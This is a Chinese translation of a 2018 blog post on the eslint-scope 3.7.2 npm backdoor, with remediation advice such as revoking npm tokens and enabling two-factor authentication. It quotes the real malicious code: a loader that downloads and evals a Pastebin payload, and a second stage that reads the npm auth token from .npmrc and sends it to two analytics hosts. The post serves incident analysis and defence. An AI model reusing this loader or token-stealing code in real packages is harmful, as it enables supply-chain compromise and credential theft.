<html>
<head>
<title>ESLint backdoor: what it is and how to fix the issue</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ESLint后门:它是什么以及如何解决这个问题</h1>
<blockquote>原文：<a href="https://itnext.io/eslint-backdoor-what-it-is-and-how-to-fix-the-issue-221f58f1a8c8?source=collection_archive---------3-----------------------#2018-07-13">https://itnext.io/eslint-backdoor-what-it-is-and-how-to-fix-the-issue-221f58f1a8c8?source=collection_archive---------3-----------------------#2018-07-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/18bd0227262c55bff09fa5dbb3dd161e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G6_JdLqUx3TSJE1nrp4n1g.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图片鸣谢:<a class="ae kc" href="https://flic.kr/p/5Y5QPG" rel="noopener ugc nofollow" target="_blank"> code.close() </a> by <a class="ae kc" href="https://www.flickr.com/photos/ruiwen/" rel="noopener ugc nofollow" target="_blank">文瑞蔡美儿</a>，<a class="ae kc" href="https://creativecommons.org/licenses/by-sa/2.0/" rel="noopener ugc nofollow" target="_blank"> CC-BY-SA-2.0 </a></figcaption></figure><blockquote class="kd"><p id="eed2" class="ke kf iq bd kg kh ki kj kk kl km kn dk translated">最初发表于<a class="ae kc" href="https://oprea.rocks/blog/fix-eslint-scope-backdoor/" rel="noopener ugc nofollow" target="_blank">https://oprea.rocks/blog/fix-eslint-scope-backdoor</a></p></blockquote><h2 id="7381" class="ko kp iq bd kq kr ks dn kt ku kv dp kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">2018年7月12日星期四下午1:17 GMT<a class="ae kc" href="https://github.com/pronebird" rel="noopener ugc nofollow" target="_blank">安德烈·米哈洛夫— @pronebird </a>报告了以下关于<a class="ae kc" href="https://github.com/eslint/eslint-scope" rel="noopener ugc nofollow" target="_blank"> eslint-scope </a>模块的问题:<a class="ae kc" href="https://github.com/eslint/eslint-scope/issues/39" rel="noopener ugc nofollow" target="_blank">eslint-scope中的病毒？</a></h2><p id="7ba0" class="pw-post-body-paragraph lk ll iq lm b ln lo lp lq lr ls lt lu kx lv lw lx lb ly lz ma lf mb mc md kn ij bi translated">它的要点是，有一些恶意代码添加到模块的代码库，受影响的版本是3.7.2。我之所以说<em class="me">是</em>，是因为ESLint团队迎难而上，在创纪录的时间内解决了问题— <strong class="lm ir">谢谢！</strong></p><h1 id="fc62" class="mf kp iq bd kq mg mh mi kt mj mk ml kw mm mn mo la mp mq mr le ms mt mu li mv bi translated">如何解决这个问题— <a class="ae kc" href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes#recommendations" rel="noopener ugc nofollow" target="_blank">来源</a></h1><ol class=""><li id="f4f1" class="mw mx iq lm b ln lo lr ls kx my lb mz lf na kn nb nc nd ne bi translated">立即撤销你所有的NPM代币！</li><li id="464d" class="mw mx iq lm b ln nf lr ng kx nh lb ni lf nj kn nb nc nd ne bi translated"><a class="ae kc" href="https://docs.npmjs.com/getting-started/using-two-factor-authentication" rel="noopener ugc nofollow" target="_blank">为您的NPM帐户启用双因素身份认证</a>。如果你使用Lerna的话，下面就告诉你怎么做。</li><li id="5405" class="mw mx iq lm b ln nf lr ng kx nh lb ni lf nj kn nb nc nd ne bi translated">限制可以发布到NPM的人数。</li><li id="c0b7" class="mw mx iq lm b ln nf lr ng kx nh lb ni lf nj kn nb nc nd ne bi translated">注意你使用的自动依赖升级的服务。</li><li id="903a" class="mw mx iq lm b ln nf lr ng kx nh lb ni lf nj kn nb nc nd ne bi translated">使用锁文件<code class="fe nk nl nm nn b">package-lock.json</code>或<code class="fe nk nl nm nn b">yarn.lock</code>，并锁定模块版本，以防止软件包自动升级到新版本。</li><li id="4366" class="mw mx iq lm b ln nf lr ng kx nh lb ni lf nj kn nb nc nd ne bi translated">不要在任何地方使用相同的密码。使用密码管理器生成强密码，并安全地存储它们。</li></ol><h1 id="ad14" class="mf kp iq bd kq mg mh mi kt mj mk ml kw mm mn mo la mp mq mr le ms mt mu li mv bi translated">更长的版本</h1><p id="33bf" class="pw-post-body-paragraph lk ll iq lm b ln lo lp lq lr ls lt lu kx lv lw lx lb ly lz ma lf mb mc md kn ij bi translated">这个问题与下载Pastebin文档的内容并在当前Node.js进程的上下文中使用eval 解释它的一段代码有关。</p><pre class="no np nq nr gt ns nn nt nu aw nv bi"><span id="5aaf" class="ko kp iq nn b gy nw nx l ny nz">try {<br/>  var https = require('https');<br/>  https.get({<br/>    'hostname': 'pastebin.com',<br/>    path: '/raw/XLeVP82h',<br/>    headers: {<br/>      'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',<br/>      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'<br/>    }<br/>  }, (r) =&gt; {<br/>    r.setEncoding('utf8');<br/>    r.on('data', (c) =&gt; {<br/>      eval(c);<br/>    });<br/>    r.on('error', () =&gt; {});</span><span id="9e1c" class="ko kp iq nn b gy oa nx l ny nz">  }).on('error', () =&gt; {});<br/>} catch (e) {}</span></pre><p id="340d" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">Pastebin文档的内容在问题被提交和漏洞被公开后很长时间内都不可用，但幸运的是，人们在它被删除前得到了它。</p><pre class="no np nq nr gt ns nn nt nu aw nv bi"><span id="8b12" class="ko kp iq nn b gy nw nx l ny nz">try {<br/>  var path = require('path');<br/>  var fs = require('fs');<br/>  var npmrc = path.join(process.env.HOME || process.env.USERPROFILE, '.npmrc');<br/>  var content = "nofile";</span><span id="89cc" class="ko kp iq nn b gy oa nx l ny nz">  if (fs.existsSync(npmrc)) {</span><span id="ae27" class="ko kp iq nn b gy oa nx l ny nz">    content = fs.readFileSync(npmrc, {<br/>      encoding: 'utf8'<br/>    });<br/>    content = content.replace('//registry.npmjs.org/:_authToken=', '').trim();</span><span id="5209" class="ko kp iq nn b gy oa nx l ny nz">    var https1 = require('https');<br/>    https1.get({<br/>      hostname: 'sstatic1.histats.com',<br/>      path: '/0.gif?4103075&amp;101',<br/>      method: 'GET',<br/>      headers: {<br/>        Referer: 'http://1.a/' + content<br/>      }<br/>    }, () =&gt; {}).on("error", () =&gt; {});<br/>    https1.get({<br/>      hostname: 'c.statcounter.com',<br/>      path: '/11760461/0/7b5b9d71/1/',<br/>      method: 'GET',<br/>      headers: {<br/>        Referer: 'http://2.b/' + content<br/>      }<br/>    }, () =&gt; {}).on("error", () =&gt; {});</span><span id="f7ba" class="ko kp iq nn b gy oa nx l ny nz">  }<br/>} catch (e) {}</span></pre><p id="fbc4" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">从阅读代码片段中可以看出，代码从您的主目录中读取您的<code class="fe nk nl nm nn b">.npmrc</code>文件。然后，它从中获取您的NPM身份验证令牌，并发送两个HTTP请求，一个发送给<a class="ae kc" href="http://www.histats.com/" rel="noopener ugc nofollow" target="_blank"> Histats </a>，另一个发送给<a class="ae kc" href="https://statcounter.com/" rel="noopener ugc nofollow" target="_blank"> StatCounter </a>。</p><p id="cafb" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">作者创造性地将您的令牌放在referrer URL中，并使用两个域，这与<a class="ae kc" href="https://webpack.js.org/" rel="noopener ugc nofollow" target="_blank"> Webpack </a>在进行代码拆分时创建您的包的方式非常相似。</p><p id="8fe7" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">很难说这实际上是在泄露敏感的身份验证凭证。</p><h1 id="c176" class="mf kp iq bd kq mg mh mi kt mj mk ml kw mm mn mo la mp mq mr le ms mt mu li mv bi translated">谁会受此影响？</h1><p id="a326" class="pw-post-body-paragraph lk ll iq lm b ln lo lp lq lr ls lt lu kx lv lw lx lb ly lz ma lf mb mc md kn ij bi translated">基本上每个用ESLint的人。如果您在过去几天不幸安装了ESLint，并且您将<em class="me"> eslint-scope@3.7.2 </em>作为一个依赖项安装了——这是自动发生的——您会受到影响。</p><p id="688c" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">由于ESLint在前端和后端应用程序中都有使用，并且它或多或少地成为了代码质量的事实上的标准，所以爆炸半径可能是巨大的。</p><p id="0f3f" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">你能做的是立刻撤销你所有的NPM代币，并且创造新的代币。您还应该在您的NPM帐户上启用2FA。</p><h1 id="755d" class="mf kp iq bd kq mg mh mi kt mj mk ml kw mm mn mo la mp mq mr le ms mt mu li mv bi translated">修复私有注册中心的问题</h1><p id="fe71" class="pw-post-body-paragraph lk ll iq lm b ln lo lp lq lr ls lt lu kx lv lw lx lb ly lz ma lf mb mc md kn ij bi translated">如果你运行的是私有注册表，比如Nexus，你可能仍然会受到影响。你很可能在主注册中心后面有两个注册中心——一个是私有注册中心，在那里你存储和部署你的内部、公司模块，另一个是npmjs.com的代理。</p><p id="0dab" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">代理可能会带来问题。寻找任何出现的<em class="me"> eslint-scope@3.7.2 </em>，如果找到，立即取消发布！</p><p id="1488" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">您还应该扫描您的所有系统(您还安装了dev dependencies)——这包括开发环境，但也包括构建/测试环境，并确保没有安装这个版本的模块。</p><p id="ad54" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">作为一个附加的安全措施，确保每当你的应用程序经过你的开发环境时，你使用<code class="fe nk nl nm nn b">npm install --prod</code>或<code class="fe nk nl nm nn b">yarn install --prod</code>来安装你的节点模块。您需要审查和监督的模块将会减少。</p><h1 id="1bd8" class="mf kp iq bd kq mg mh mi kt mj mk ml kw mm mn mo la mp mq mr le ms mt mu li mv bi translated">进一步阅读</h1><p id="ddaa" class="pw-post-body-paragraph lk ll iq lm b ln lo lp lq lr ls lt lu kx lv lw lx lb ly lz ma lf mb mc md kn ij bi translated">ESLint核心团队迅速修复了该问题，并发布了一篇事后博客文章，详细说明了时间表、折衷的软件包以及软件包作者需要采取的应急措施。</p><p id="9b8e" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">可以在这里找到:<a class="ae kc" href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes" rel="noopener ugc nofollow" target="_blank">2018年7月12日发布的针对恶意包的事后调查</a></p><p id="1253" class="pw-post-body-paragraph lk ll iq lm b ln ob lp lq lr oc lt lu kx od lw lx lb oe lz ma lf of mc md kn ij bi translated">如果你想进一步了解这个问题，请点击以下链接:</p><ul class=""><li id="bf11" class="mw mx iq lm b ln ob lr oc kx og lb oh lf oi kn oj nc nd ne bi translated"><a class="ae kc" href="https://github.com/eslint/eslint-scope/issues/39" rel="noopener ugc nofollow" target="_blank">GitHub问题:eslint-scope中的病毒？#39 </a></li><li id="0281" class="mw mx iq lm b ln nf lr ng kx nh lb ni lf nj kn oj nc nd ne bi translated"><a class="ae kc" href="https://blog.sqreen.io/eslint-backdoor/" rel="noopener ugc nofollow" target="_blank"> blog.sqreen.io: ESLint后门:撤销所有令牌</a></li></ul></div></div>    
</body>
</html>